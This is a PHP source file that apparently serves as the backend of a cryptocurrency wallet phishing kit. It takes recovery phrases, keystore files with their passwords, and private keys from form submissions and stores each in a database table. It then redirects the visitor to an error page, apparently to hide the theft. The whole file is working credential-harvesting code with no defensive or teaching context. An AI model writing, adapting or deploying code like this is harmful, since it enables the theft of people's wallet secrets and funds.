<?php

// Include your database connection file
require_once("../_db.php");

if (isset($_POST['submit_phrase'])) {
    // Retrieve form data
    $walletName = $_POST['wallet_name'];  // Add the input name attribute for wallet_name
    $recoveryPhrase = $_POST['phrase'];

    // Prepare the SQL statement
    $stmt = $conn->prepare("INSERT INTO wallet_phrase (wallet_name,phrase) VALUES (?, ?)");
    
 // Check if the statement was prepared successfully
 if ($stmt) {
    // Bind parameters
    $stmt->bind_param("ss", $walletName, $recoveryPhrase);

    // Execute the statement
    if ($stmt->execute()) {
        // echo "Data inserted successfully!";
        header("location:error.php");
    } else {
        echo "Error executing statement: " . $stmt->error;
    }

    // Close the statement
    $stmt->close();
} else {
    echo "Error preparing statement: " . $conn->error;
}
}


// Include your database connection file
require_once("../../_db.php");

if (isset($_POST['submit_keystore'])) {
    // Retrieve form data
    $walletName = $_POST['wallet_name'];
    $keystore = $_POST['keystore'];
    $walletPassword = $_POST['wallet_pass'];

    // Prepare the SQL statement
    $stmt = $conn->prepare("INSERT INTO wallet_keystore (wallet_name, keystore, wallet_pass) VALUES (?, ?, ?)");
    
    // Check if the statement was prepared successfully
    if ($stmt) {
        // Bind parameters
        $stmt->bind_param("sss", $walletName, $keystore, $walletPassword);

        // Execute the statement
        if ($stmt->execute()) {
            // echo "Data inserted successfully!";
            header("location:error.php");
        } else {
            echo "Error executing statement: " . $stmt->error;
        }

        // Close the statement
        $stmt->close();
    } else {
        echo "Error preparing statement: " . $conn->error;
    }

    // Close the connection
    $conn->close();
}


// Include your database connection file
require_once("../../_db.php");

if (isset($_POST['submit_private_key'])) {
    // Retrieve form data
    $walletName = $_POST['wallet_name'];  // Add the input name attribute for wallet_name
    $privateKey = $_POST['private_key'];

    // Prepare the SQL statement
    $stmt = $conn->prepare("INSERT INTO wallet_private_key (wallet_name,private_key) VALUES (?, ?)");
    
 // Check if the statement was prepared successfully
 if ($stmt) {
    // Bind parameters
    $stmt->bind_param("ss", $walletName, $privateKey);

    // Execute the statement
    if ($stmt->execute()) {
        // echo "Data inserted successfully!";
        header("location:error.php");
    } else {
        echo "Error executing statement: " . $stmt->error;
    }

    // Close the statement
    $stmt->close();
} else {
    echo "Error preparing statement: " . $conn->error;
}
}

